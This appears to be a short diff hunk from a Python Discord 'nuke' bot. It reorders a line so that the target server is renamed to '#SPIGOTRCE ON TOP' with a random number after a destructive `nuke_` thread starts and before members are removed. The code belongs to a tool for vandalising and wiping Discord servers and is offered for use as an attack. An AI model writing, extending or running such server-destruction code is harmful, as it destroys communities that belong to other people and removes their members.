@@ -225,8 +225,8 @@ async def nuke(ctx):
     global GUILD
     GUILD = ctx.guild.id
     await ctx.message.delete()
-    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
     threading.Thread(target=nuke_,).start()
+    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
     await remove_members()
 
 
